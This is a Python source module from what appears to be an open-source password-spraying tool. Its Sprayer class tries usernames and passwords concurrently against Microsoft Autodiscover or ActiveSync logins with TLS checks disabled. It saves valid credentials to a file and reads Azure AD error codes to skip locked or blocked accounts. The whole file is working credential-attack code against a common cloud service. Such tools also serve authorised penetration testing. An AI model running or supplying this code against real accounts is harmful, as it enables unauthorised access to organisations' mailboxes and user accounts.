#!/usr/bin/env python3
# Based on: https://github.com/sensepost/ruler/
#           https://github.com/byt3bl33d3r/SprayingToolkit/
# Based on: https://bitbucket.org/grimhacker/office365userenum/

import sys
import asyncio
import urllib3
import requests
from .settings import *
from .helper import Helper
from .colors import text_colors
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Sprayer:
    """ Perform password spraying using Microsoft Autodiscover """

    valid_creds = {}  # Valid credentials storage
    helper = Helper() # Helper functions

    def __init__(self, userlist, args):
        self.running  = True
        self.userlist = userlist
        self.args     = args
        self.settings = autodiscover if not args.secondary else activesync
        self.proxy    = None if not args.proxy else {
            "http": args.proxy, "https": args.proxy
        }
        if args.secondary:
            headers["MS-ASProtocolVersion"] = "14.0"


    def shutdown(self, ctrl=True):
        if ctrl: print("\n[!] CTRL-C caught. Completing current queue...")
        self.helper.write_data(self.valid_creds, "%s/valid_users.txt" % (self.args.output))
        self.running = False


    async def run(self, loop, password_chunk):
        """ Asynchronously send HTTP requests """
        futures = [
            loop.run_in_executor( # Use default executor
                None, self.spray, user, password
            ) for user in self.userlist for password in password_chunk
        ]

        await asyncio.wait(futures)


    async def run_paired(self, loop, passlist):
        """ Asynchronously send HTTP requests """
        futures = [
            loop.run_in_executor( # Use default executor
                None, self.spray, user, password
            ) for user, password in zip(self.userlist, passlist)
        ]

        await asyncio.wait(futures)


    def spray(self, user, password):
        """ Password spray Microsoft using Microsoft Autodiscover """
        try:
            email = self.helper.check_email(user, self.args.domain)
            auth  = (email, password)
            rsp   = self.settings["method"](
                self.settings["url"],
                headers=headers,
                auth=auth,
                timeout=self.args.timeout,
                proxies=self.proxy,
                verify=False
            )

            status = rsp.status_code

            # Valid credentials
            if status in self.settings["status_codes"].keys():
                ok,msg = (self.settings["status_codes"][status], password)
                if status != 200:
                    msg += " (Manually confirm [2FA, Locked, etc.])"

                sys.stdout.write("\r[%s%s%s] %s:%s%s\n" % (text_colors.green, ok, text_colors.reset, email, msg, self.helper.space))
                sys.stdout.flush()
                self.valid_creds[email] = password
                self.userlist.remove(user) # Remove valid user from being sprayed again

            # Invalid credentials
            else:
                err,msg = ("BAD_PASSWD", "%s%s" % (password, self.helper.space))
                if status not in [401, 404]:
                    msg += " (Unknown Error [%s])%s" % (status, self.helper.space)

                # Handle Autodiscover errors that are returned by the server
                if "X-AutoDiscovery-Error" in rsp.headers:
                    # Handle Basic Auth blocking
                    if any(_str in rsp.headers.get("X-AutoDiscovery-Error") for _str in ["Basic Auth Blocked","BasicAuthBlockStatus - Deny","BlockBasicAuth - User blocked"]):
                        err = "BLOCKED"
                        msg = " Basic Auth blocked for this user. Removing from spray rotation.%s\n" % self.helper.space
                        self.userlist.remove(user)

                    else:
                        # Handle AADSTS errors - remove user from future rotations
                        for code in self.settings["AADSTS_codes"].keys():
                            if code in rsp.headers.get("X-AutoDiscovery-Error"):
                                err = self.settings["AADSTS_codes"][code][0]
                                msg = " %s. Removing from spray rotation.%s\n" % (self.settings["AADSTS_codes"][code][1], self.helper.space)
                                self.userlist.remove(user)
                                break

                sys.stdout.write("\r[%s%s%s] %s:%s" % (text_colors.red, err, text_colors.reset, email, msg))
                sys.stdout.flush()

        except Exception as e:
            if self.args.debug: print("[ERROR] %s" % e)
            pass